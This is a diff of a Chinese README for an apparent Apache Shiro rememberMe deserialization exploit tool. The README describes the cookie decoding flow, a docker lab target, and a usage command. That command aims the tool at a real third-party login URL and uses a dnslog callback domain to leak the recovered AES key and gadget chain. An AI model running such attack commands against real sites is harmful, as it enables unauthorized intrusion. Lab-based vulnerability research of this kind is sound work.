@@ -11,8 +11,8 @@ shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：
 `得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化 `
 
 ## 环境
-linux/win10 均可
-python2/python3 均可
+linux/win10 均可                 
+python2/python3 均可          
 由于module下有ysoserial.jar 所以项目略大，多多包涵
 ## 本地搭建靶场
 ```
@@ -25,7 +25,7 @@ docker run -d -p 80:8080 medicean/vulapps:s_shiro_1
 ```
 python3 shiro_crack.py http://www.baidu.com/login.do 1695jb.dnslog.cn
 ```
-成功后查看记录-记录格式为 {key}.{{module}}.dnslogurl
+成功后查看记录-记录格式为 {{key}}.{{module}}.dnslogurl
 ```
 U3ByaW5nQmxhZGUAAAAAAA.CommonsBeanutils1.x9zm4v.dnslog.cn
 ```
